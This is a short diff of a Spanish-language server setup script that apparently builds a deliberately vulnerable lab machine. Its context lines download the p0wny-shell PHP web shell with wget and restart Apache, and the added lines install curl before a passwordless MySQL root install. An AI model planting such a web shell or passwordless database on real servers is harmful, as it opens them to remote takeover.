@@ -12,6 +12,8 @@ wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php --no-c
 cd &> /dev/null
 /etc/init.d/apache2 restart &> /dev/null
 
+echo "Instalando curl"
+DEBIAN_FRONTEND=noninteractive apt-get -y install curl &> /dev/null
 
 echo "Instalando MySQL Server sin contraseña root"
 DEBIAN_FRONTEND=noninteractive apt-get -y install mysql-server &> /dev/null
